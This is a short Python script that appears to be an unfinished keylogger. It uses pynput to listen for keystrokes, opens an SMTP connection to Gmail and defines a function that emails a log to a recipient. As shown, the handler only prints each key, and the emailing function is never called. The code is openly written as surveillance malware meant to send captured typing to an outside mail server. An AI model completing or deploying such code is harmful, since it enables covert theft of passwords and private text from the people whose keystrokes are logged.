import os.path
import smtplib
from pynput.keyboard import Key, Listener


send_email = ""
recv = ""
password = ""
server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
server.login(send_email,password)

keys = ''
logg = ''


def send_log():
     server.sendmail(send_email,recv, logg)

def on_press(key):
    global keys, count, logg
    print("User is Typing {0}".format(key)) 
    

          
def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
  

    